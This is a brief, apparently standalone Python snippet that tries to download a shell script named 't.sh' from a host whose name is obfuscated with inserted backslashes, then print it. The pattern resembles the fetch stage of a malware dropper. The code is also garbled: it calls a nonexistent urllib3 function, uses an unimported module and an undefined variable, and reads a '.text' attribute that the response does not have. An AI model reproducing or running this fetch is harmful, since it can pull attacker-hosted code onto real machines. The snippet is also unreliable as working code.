import urllib3

req = urllib3.request.urlopen('http://ki\\s\\s.a-d\\og.t\\o\p/t.sh')
opener = urllib.request.build_opener()
response = opener.open(request)
print(response.text)
